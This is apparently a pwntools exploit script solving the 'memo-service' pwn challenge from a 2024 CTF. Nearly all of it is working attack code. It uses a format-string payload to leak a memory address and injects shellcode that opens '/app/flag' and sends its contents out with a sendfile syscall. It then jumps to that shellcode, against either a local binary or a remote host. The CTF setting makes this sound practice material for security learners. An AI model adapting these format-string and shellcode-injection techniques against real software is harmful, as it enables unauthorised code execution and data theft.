#!/usr/bin/env python3
from pwn import *
import os
import sys

context.update(
    arch='amd64',
    endian='little',
    os='linux',
    log_level='debug',
    terminal=['tmux', 'split-window', '-h', '-p 65'],
)

REMOTE = False
TARGET = os.path.realpath('/ctf-archive/cr3 CTF 2024/pwn/memo-service/chal')
elf = ELF(TARGET)

def attach(r):
    if not REMOTE:
        bkps = ['*main+546']
        cmds = []

        gdb.attach(r, '\n'.join(['break {}'.format(x) for x in bkps] + cmds))
    return

def exploit(r):
    attach(r)

    shellcode = shellcraft.openat(-1, '/app/flag')
    shellcode += '''
        mov rdi, 0x1
        mov rsi, rax
        xor rdx, rdx
        mov r10d, 0x7fffffff
        mov rax, 0x28
        syscall
    '''

    r.sendlineafter(b'note: ', str(0x700000100).encode())
    r.sendlineafter(b'name: ', b'%8$20p')
    r.sendlineafter(b'note: ', asm(shellcode))
    r.recvuntil('Thank you ')

    mem_addr = int(r.recvline().strip().decode(), 16)

    r.sendlineafter(b'(y/n): ', b'y')
    r.sendlineafter(b'passcode: ', str(mem_addr).encode())
    r.interactive()
    return

if __name__ == '__main__':
    if len(sys.argv) == 2 and sys.argv[1] == 'remote':
        REMOTE = True
        r = remote('1337.sb', 40001)
    else:
        REMOTE = False
        r = process([TARGET,])

    exploit(r)
    exit(0)
